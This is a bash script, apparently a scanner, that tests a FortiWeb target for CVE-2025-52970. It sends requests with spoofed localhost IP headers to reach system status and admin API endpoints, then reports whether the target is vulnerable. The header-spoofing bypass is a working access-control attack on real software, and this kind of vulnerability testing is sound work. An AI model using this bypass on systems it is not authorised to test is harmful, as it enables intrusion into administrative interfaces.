#!/bin/bash

# Script to test CVE-2025-52970 (FortiWeb Broken Access Control)
# Usage: ./test-fortiweb-vulnerability.sh <target_url> [-v]

TARGET_URL=$1
VERBOSE=false

if [ "$2" == "-v" ]; then
    VERBOSE=true
fi

if [ -z "$TARGET_URL" ]; then
    echo "Usage: $0 <target_url> [-v]"
    echo "Example: $0 https://192.168.1.100 -v"
    exit 1
fi

echo "=========================================="
echo "Testing CVE-2025-52970 on: $TARGET_URL"
echo "=========================================="
echo ""

# Test 1: System Status Endpoint
echo "Test 1: Checking system status endpoint..."
STATUS_RESPONSE=$(curl -s -w "%{http_code}" -H "X-Forwarded-For: 127.0.0.1" \
    -H "X-Real-IP: 127.0.0.1" \
    -H "X-Client-IP: 127.0.0.1" \
    -H "X-Remote-IP: 127.0.0.1" \
    -H "X-Originating-IP: 127.0.0.1" \
    -H "X-Remote-Addr: 127.0.0.1" \
    "$TARGET_URL/api/v2.0/system/status")

STATUS_CODE="${STATUS_RESPONSE: -3}"
STATUS_BODY="${STATUS_RESPONSE%???}"

if [ "$VERBOSE" = true ]; then
    echo "Status Code: $STATUS_CODE"
    echo "Response Body: $STATUS_BODY"
fi

if [ "$STATUS_CODE" = "200" ]; then
    echo "‚úÖ System status endpoint accessible (potential vulnerability)"
    if echo "$STATUS_BODY" | grep -q "FortiWeb"; then
        echo "‚úÖ FortiWeb detected in response"
    else
        echo "‚ö†Ô∏è  FortiWeb not detected in response"
    fi
else
    echo "‚ùå System status endpoint not accessible (HTTP $STATUS_CODE)"
fi

echo ""

# Test 2: Admin Endpoint
echo "Test 2: Checking admin endpoint..."
ADMIN_RESPONSE=$(curl -s -w "%{http_code}" -H "X-Forwarded-For: 127.0.0.1" \
    -H "X-Real-IP: 127.0.0.1" \
    -H "X-Client-IP: 127.0.0.1" \
    -H "X-Remote-IP: 127.0.0.1" \
    -H "X-Originating-IP: 127.0.0.1" \
    -H "X-Remote-Addr: 127.0.0.1" \
    "$TARGET_URL/api/v2.0/system/admin")

ADMIN_CODE="${ADMIN_RESPONSE: -3}"
ADMIN_BODY="${ADMIN_RESPONSE%???}"

if [ "$VERBOSE" = true ]; then
    echo "Status Code: $ADMIN_CODE"
    echo "Response Body: $ADMIN_BODY"
fi

if [ "$ADMIN_CODE" = "200" ]; then
    echo "‚úÖ Admin endpoint accessible (vulnerability confirmed)"
    if echo "$ADMIN_BODY" | grep -q "admin\|privilege"; then
        echo "‚úÖ Admin/privilege information exposed"
    else
        echo "‚ö†Ô∏è  Admin/privilege information not clearly visible"
    fi
else
    echo "‚ùå Admin endpoint not accessible (HTTP $ADMIN_CODE)"
fi

echo ""

# Test 3: Without bypass headers (should fail)
echo "Test 3: Testing without bypass headers (should fail)..."
NO_BYPASS_RESPONSE=$(curl -s -w "%{http_code}" "$TARGET_URL/api/v2.0/system/admin")
NO_BYPASS_CODE="${NO_BYPASS_RESPONSE: -3}"

if [ "$VERBOSE" = true ]; then
    echo "Status Code: $NO_BYPASS_CODE"
fi

if [ "$NO_BYPASS_CODE" = "401" ] || [ "$NO_BYPASS_CODE" = "403" ]; then
    echo "‚úÖ Proper authentication required without bypass headers"
else
    echo "‚ö†Ô∏è  Unexpected response without bypass headers (HTTP $NO_BYPASS_CODE)"
fi

echo ""

# Summary
echo "=========================================="
echo "VULNERABILITY ASSESSMENT SUMMARY"
echo "=========================================="

if [ "$STATUS_CODE" = "200" ] && [ "$ADMIN_CODE" = "200" ]; then
    echo "üö® VULNERABLE: CVE-2025-52970 detected"
    echo "   - System status accessible without auth"
    echo "   - Admin endpoints accessible with crafted headers"
    echo "   - Broken access control confirmed"
elif [ "$STATUS_CODE" = "200" ]; then
    echo "‚ö†Ô∏è  PARTIALLY VULNERABLE: System accessible but admin endpoint protected"
elif [ "$ADMIN_CODE" = "200" ]; then
    echo "‚ö†Ô∏è  PARTIALLY VULNERABLE: Admin accessible but system endpoint protected"
else
    echo "‚úÖ NOT VULNERABLE: Proper authentication required"
fi

echo ""
echo "To test with Nuclei:"
echo "nuclei -t http/cves/2025/CVE-2025-52970.yaml -u $TARGET_URL"
echo "nuclei -t http/cves/2025/CVE-2025-52970.yaml -debug -u $TARGET_URL -v"
